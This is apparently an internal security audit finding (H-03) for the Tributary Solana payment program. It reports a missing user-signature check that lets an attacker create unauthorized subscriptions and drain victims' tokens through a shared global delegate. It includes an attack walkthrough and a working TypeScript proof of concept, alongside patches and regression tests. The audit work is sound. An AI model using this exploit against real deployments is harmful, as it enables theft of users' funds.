---
# tributary-l4sv
title: 'H-03: No User Signature on create_payment_policy — Unauthorized Subscription Creation'
status: scrapped
type: task
priority: high
tags:
    - security
    - audit
created_at: 2026-06-13T05:51:21Z
updated_at: 2026-06-13T06:13:19Z
parent: tributary-4kt4
---

# H-03: No User Signature on `create_payment_policy` — Unauthorized Subscription Creation

| Field          | Value                                                          |
| -------------- | -------------------------------------------------------------- |
| **Severity**   | **HIGH**                                                       |
| **File**       | `programs/tributary/src/instructions/create_payment_policy.rs` |
| **Function**   | `CreatePaymentPolicy::handler_create_payment_policy`           |
| **Program ID** | `TRibg8W8zmPHQqWtyAD1rEBRXEdyU13Mu6X1Sg42tJ`                   |
| **Status**     | Unresolved                                                     |

---

## Description

The `create_payment_policy` instruction requires **no signature from the user whose payment account is being subscribed**. The `user` account is passed as a `/// CHECK: The owner account - does NOT need to sign` annotation with `#[account()]` — no signer constraint.

```rust
// create_payment_policy.rs:7-9
/// CHECK: The owner account - does NOT need to sign
#[account()]
pub user: AccountInfo<'info>,
```

The only constraint linking the policy to the user is:

```rust
// create_payment_policy.rs:13-16
constraint = user_payment.owner == user.key(),
```

This is a read-only ownership check — it verifies that the `user_payment.owner` matches the `user` pubkey, but **does not require `user` to sign the transaction**. Anyone can pass any pubkey as `user` as long as it matches the owner stored in `user_payment`.

Combined with H-02 (same issue in `create_user_payment`), an attacker can:

1. Create a `UserPayment` for any victim wallet (H-02)
2. Create a `PaymentPolicy` against that `UserPayment` (H-03 — this finding)
3. Neither step requires the victim's signature

The **delegate approval** on the victim's token account is the sole safety valve. However, the `payments_delegate` PDA is a **global singleton** seeded from `[PAYMENTS_SEED]` (i.e., `b"payments"`). It is shared across all users, all policies, and all gateways. If a victim has approved this delegate for _any_ policy — even one they intentionally created — the attacker's unauthorized policy reuses the **same delegate PDA**, and `execute_payment` will succeed.

### The Delegate Reuse Problem

From `execute_payment.rs:39-44`:

```rust
#[account(
    seeds = [PAYMENTS_SEED],
    bump
)]
pub payments_delegate: UncheckedAccount<'info>,
```

The delegate is derived as `seeds = [b"payments"]` — a single PDA for the entire program. From `execute_payment.rs:162-165`:

```rust
COption::Some(d) if d == &pd_key => {
    let seeds: Vec<Vec<u8>> =
        vec![PAYMENTS_SEED.to_vec(), vec![payments_delegate_bump]];
    (seeds, payments_delegate_info.clone())
}
```

When `execute_payment` runs, it checks whether the user's token account has `payments_delegate` set as the delegate. If the victim previously approved the delegate for a legitimate subscription, the token account's `delegate` field already points to this PDA. The attacker's unauthorized policy rides the same delegation — **no additional user interaction required**.

---

## Attack Scenario

### Prerequisites

- Victim wallet `V` holds SPL tokens in an ATA.
- Victim has **not yet** interacted with the Tributary program (no `UserPayment` exists).
- OR: Victim already has a `UserPayment` and has approved the `payments_delegate` for a legitimate policy.

### Step-by-Step Attack

**Case A — Fresh victim (H-02 + H-03 combined):**

```
Step 1: Attacker calls create_user_payment
   ┌──────────────────────────────────────────────────┐
   │ owner       = V (victim pubkey, no signature)    │
   │ token_mint  = USDC_MINT                          │
   │ token_account = V's USDC ATA                     │
   │ fee_payer   = Attacker (signs and pays rent)     │
   └──────────────────────────────────────────────────┘
   Result: UserPayment{V, USDC} created. V is unaware.

Step 2: Attacker calls create_payment_policy
   ┌──────────────────────────────────────────────────┐
   │ user        = V (victim pubkey, no signature)    │
   │ user_payment = UserPayment{V, USDC}              │
   │ recipient   = Attacker's wallet                  │
   │ gateway     = Attacker-controlled gateway        │
   │ fee_payer   = Attacker (signs and pays rent)     │
   │ policy_type = Subscription {                      │
   │     amount: 1000 USDC,                           │
   │     next_payment_due: NOW,                       │
   │     ...                                          │
   │ }                                                │
   └──────────────────────────────────────────────────┘
   Result: PaymentPolicy created. 1000 USDC/month to attacker.
           V is still unaware.

Step 3: Victim approves payments_delegate for ANY reason
   ┌──────────────────────────────────────────────────┐
   │ V calls token.approve(delegate=payments_delegate, │
   │                      amount=large_number)         │
   │ This may happen via:                             │
   │  - Legitimate Tributary subscription setup       │
   │  - UI flow that approves for a different gateway │
   │  - Any dApp interaction that sets this delegate  │
   └──────────────────────────────────────────────────┘

Step 4: Attacker calls execute_payment immediately
   ┌──────────────────────────────────────────────────┐
   │ fee_payer   = Attacker (or gateway signer)       │
   │ payment_policy = Attacker's unauthorized policy  │
   │ payments_delegate = global PDA                   │
   │ V's token account already has delegate set       │
   └──────────────────────────────────────────────────┘
   Result: 1000 USDC transferred from V to Attacker.
```

**Case B — Victim with existing policies:**

If the victim already has a `UserPayment` and has approved `payments_delegate`:

```
Step 1: Attacker calls create_payment_policy directly
   (user = V, user_payment = V's existing account, no V signature)

Step 2: Attacker calls execute_payment
   (delegate already approved, funds drain immediately)
```

The attacker does not need to wait. If the victim has already approved the delegate for their own legitimate subscription, the attacker's policy reuses the same approval and executes immediately.

---

## Impact

- **Unauthorized recurring payments** — an attacker can drain a victim's tokens on a schedule, every period, until the victim notices and revokes the delegate.
- **No user consent** — the victim's wallet never signs a transaction authorizing the policy.
- **Reusable delegate** — the global `payments_delegate` PDA means a single delegate approval covers all policies, including attacker-created ones.
- **Persistent attack surface** — the policy remains active indefinitely (or until max renewals). The victim may not notice for multiple payment cycles.
- **Gasless for attacker** — the attacker only pays rent-exempt costs (~0.02 SOL per account). The victim's tokens fund the actual payments.

---

## Proof of Concept

```typescript
import { Program, AnchorProvider, BN } from "@coral-xyz/anchor";
import {
  PublicKey,
  Keypair,
  SystemProgram,
  SYSVAR_RENT_PUBKEY,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createAssociatedTokenAccount,
  mintTo,
  createApproveInstruction,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { assert } from "chai";

// Prerequisites: attacker keypair, victim keypair, USDC mint, funded ATAs

async function poc(attacker: Keypair, victim: Keypair, mint: PublicKey) {
  // ── Step 1: Create UserPayment for victim (no victim signature) ──
  const [userPaymentPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("user_payment"), victim.publicKey.toBuffer(), mint.toBuffer()],
    programId
  );

  const victimAta = await getAssociatedTokenAddress(mint, victim.publicKey);

  await program.methods
    .createUserPayment()
    .accounts({
      owner: victim.publicKey, // No signer required!
      userPayment: userPaymentPda,
      tokenAccount: victimAta,
      tokenMint: mint,
      config: configPda,
      systemProgram: SystemProgram.programId,
      feePayer: attacker.publicKey, // Attacker pays rent
    })
    .signers([attacker]) // Only attacker signs
    .rpc();

  // ── Step 2: Create PaymentPolicy for victim (no victim signature) ──
  const [paymentsDelegate] = PublicKey.findProgramAddressSync(
    [Buffer.from("payments")],
    programId
  );

  const [gatewayPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("gateway"), attacker.publicKey.toBuffer()],
    programId
  );

  // Create attacker-controlled gateway first
  // ... (gateway setup omitted for brevity)

  const policyType = {
    subscription: {
      amount: new BN(1_000_000_000), // 1000 USDC
      autoRenew: true,
      maxRenewals: null,
      paymentFrequency: { monthly: {} },
      nextPaymentDue: new BN(Math.floor(Date.now() / 1000)), // NOW
      padding: Array(97).fill(0),
    },
  };

  const [paymentPolicyPda] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("payment_policy"),
      userPaymentPda.toBuffer(),
      new BN(1).toArrayLike(Buffer, "le", 8), // policy_id = 1
    ],
    programId
  );

  await program.methods
    .createPaymentPolicy(policyType, Array(64).fill(0))
    .accounts({
      user: victim.publicKey, // No signer required!
      userPayment: userPaymentPda,
      recipient: attacker.publicKey, // Attacker receives payments
      tokenMint: mint,
      gateway: gatewayPda,
      config: configPda,
      paymentPolicy: paymentPolicyPda,
      systemProgram: SystemProgram.programId,
      feePayer: attacker.publicKey,
    })
    .signers([attacker]) // Only attacker signs
    .rpc();

  // ── Step 3: Victim approves delegate for a legitimate policy ──
  // (This may happen via normal UI flow — the victim doesn't know
  //  about the attacker's policy)
  await sendTransaction(
    createApproveInstruction(
      victimAta,
      paymentsDelegate, // Global delegate PDA
      victim.publicKey,
      100_000_000_000n // Approve large amount
    ),
    [victim] // Victim signs only the token approval
  );

  // ── Step 4: Attacker executes payment ──
  // The delegate is already approved on victim's ATA.
  // The unauthorized policy uses the same delegate.
  await program.methods
    .executePayment(null)
    .accounts({
      feePayer: attacker.publicKey,
      paymentsDelegate,
      paymentPolicy: paymentPolicyPda,
      userPayment: userPaymentPda,
      gateway: gatewayPda,
      config: configPda,
      userTokenAccount: victimAta,
      mint,
      recipientTokenAccount: attackerAta,
      gatewayFeeAccount: attackerFeeAta,
      protocolFeeAccount: protocolFeeAta,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([attacker])
    .rpc();

  // Result: 1000 USDC transferred from victim to attacker.
  // This will repeat every month until the policy is paused
  // or the delegate is revoked.
}
```

---

## Patch Options

### Option A: Require `user_payment.owner` to sign (Recommended)

Add a signer constraint on the `user` account in `CreatePaymentPolicy`. This ensures only the payment account owner can create policies against their account.

**File: `programs/tributary/src/instructions/create_payment_policy.rs`**

```rust
// BEFORE (lines 7-9):
/// CHECK: The owner account - does NOT need to sign
#[account()]
pub user: AccountInfo<'info>,

// AFTER:
#[account(
    constraint = user.key() == user_payment.owner @ TributaryError::Unauthorized
)]
pub user: Signer<'info>,
```

**Note:** The `constraint = user_payment.owner == user.key()` on `user_payment` (line 15) already establishes the ownership relationship. Changing `user` from `AccountInfo` to `Signer` adds the missing cryptographic proof. The existing constraint on line 15 can be kept as defense-in-depth, or the new constraint on `user` can replace it.

Apply the same change to `create_user_payment.rs` for H-02:

```rust
// BEFORE (lines 7-9 of create_user_payment.rs):
/// CHECK: The owner account - does NOT need to sign
#[account()]
pub owner: AccountInfo<'info>,

// AFTER:
#[account()]
pub owner: Signer<'info>,
```

**Impact:** Breaking change. Existing integrations must send the owner's signature when creating `UserPayment` and `PaymentPolicy` accounts. This is the correct security posture.

---

### Option B: Scope delegate approvals per-policy

Instead of a global `payments_delegate` PDA, derive a unique delegate PDA per `(user_payment, recipient, gateway)` tuple. This way, approving a delegate for one policy does not grant access to other policies.

**File: `programs/tributary/src/constants.rs`**

```rust
// Add a new seed for per-policy delegates:
pub const POLICY_DELEGATE_SEED: &[u8] = b"policy_delegate";
```

**File: `programs/tributary/src/instructions/execute_payment.rs`**

```rust
// BEFORE (lines 39-44):
#[account(
    seeds = [PAYMENTS_SEED],
    bump
)]
pub payments_delegate: UncheckedAccount<'info>,

// AFTER:
#[account(
    seeds = [
        POLICY_DELEGATE_SEED,
        user_payment.key().as_ref(),
        payment_policy.recipient.as_ref(),
        payment_policy.gateway.as_ref(),
    ],
    bump
)]
pub payments_delegate: UncheckedAccount<'info>,
```

The delegate resolution in `execute_payment.rs:152-168` would use the updated seeds:

```rust
// BEFORE:
vec![PAYMENTS_SEED.to_vec(), vec![payments_delegate_bump]]

// AFTER:
vec![
    POLICY_DELEGATE_SEED.to_vec(),
    up_key.as_ref().to_vec(),
    payment_policy.recipient.as_ref().to_vec(),
    payment_policy.gateway.as_ref().to_vec(),
    vec![payments_delegate_bump],
]
```

**Impact:** Breaking change. Users must approve a unique delegate per `(recipient, gateway)` pair. This is more secure but increases the number of `approve` transactions. The global delegate would need a migration path or coexistence period.

---

### Option C: Accept as documented design with delegate approval as explicit opt-in

Document that `create_user_payment` and `create_payment_policy` are permissionless by design. The delegate approval (`token.approve`) is the explicit user opt-in that authorizes fund transfers. Anyone can _create_ a policy, but only the user can _fund_ it by approving the delegate.

This is defensible **only if** the following conditions are met:

1. The delegate PDA is scoped per-policy (Option B), so approving one policy doesn't implicitly approve others.
2. The UI clearly shows all pending/active policies before requesting delegate approval.
3. The program emits events that indexers can use to notify users of unexpected policy creation.

**Without Option B**, this design is unsafe because the global delegate approval covers all policies indiscriminately.

**If accepting this design, add documentation:**

```rust
/// # Design Note
///
/// `create_payment_policy` is intentionally permissionless — any fee payer can
/// create a policy against any `UserPayment`. The security model relies on the
/// user explicitly approving the `payments_delegate` on their token account
/// via `token.approve()`. No funds can move without this explicit on-chain
/// opt-in.
///
/// **WARNING:** Because the `payments_delegate` PDA is global (`seeds = [b"payments"]`),
/// a single `approve` call authorizes ALL policies for the user. If multiple
/// actors can create policies for the same user, the user must review ALL
/// policies before approving the delegate. See H-03 for mitigations.
```

---

## Recommendation

**Apply Option A** (require owner signature). It is the simplest fix with the highest assurance:

```rust
// create_payment_policy.rs — change user from AccountInfo to Signer
pub user: Signer<'info>,
```

```rust
// create_user_payment.rs — change owner from AccountInfo to Signer
pub owner: Signer<'info>,
```

This is a two-line change per file. It eliminates both H-02 and H-03 at the root cause — the user must explicitly authorize account/policy creation by signing the transaction.

**Additionally, consider Option B** as a defense-in-depth measure. Even with owner signatures, scoping the delegate per-policy limits blast radius if a single policy's delegate is compromised or overly-approved.

**Do not accept Option C** without first implementing Option B. The global delegate PDA makes the permissionless design unsafe.

---

## Testing Instructions

### Regression Test (verify the fix)

1. Generate a fresh attacker keypair and victim keypair.
2. Fund victim's ATA with test tokens.
3. Attempt `create_user_payment` with `owner = victim.pubkey()` and `fee_payer = attacker` — **without victim signing**.
   - **Expected (after fix):** Transaction fails with `TransactionError::SignatureVerification` or Anchor constraint error.
4. Attempt `create_payment_policy` with `user = victim.pubkey()` and `fee_payer = attacker` — **without victim signing**.
   - **Expected (after fix):** Same failure.
5. Retry both calls **with victim signing**.
   - **Expected:** Both succeed. Policy is created. Delegate approval required before execution.

### Positive Test (legitimate flow still works)

1. Victim signs `create_user_payment`.
2. Victim signs `create_payment_policy` (or authorizes via gateway).
3. Victim approves `payments_delegate` on their token account.
4. Gateway executes payment.
   - **Expected:** Payment succeeds. Fees distributed correctly.

### Edge Cases

- Verify that the `user.key() == user_payment.owner` constraint still rejects mismatched keys even with the signer check.
- Verify that existing policies created before the patch are not affected (no migration needed for state — only the instruction validation changes).
- Test with multiple policies per `UserPayment` — each should still require owner signature at creation time.

---

## References

| Component                        | File                       | Lines   |
| -------------------------------- | -------------------------- | ------- |
| Missing signer on `user`         | `create_payment_policy.rs` | 7-9     |
| Missing signer on `owner` (H-02) | `create_user_payment.rs`   | 7-9     |
| Global delegate PDA seeds        | `execute_payment.rs`       | 39-44   |
| Delegate resolution (reuse)      | `execute_payment.rs`       | 152-168 |
| Delegate PDA seed constant       | `constants.rs`             | 10      |
| Ownership check (read-only)      | `create_payment_policy.rs` | 15      |
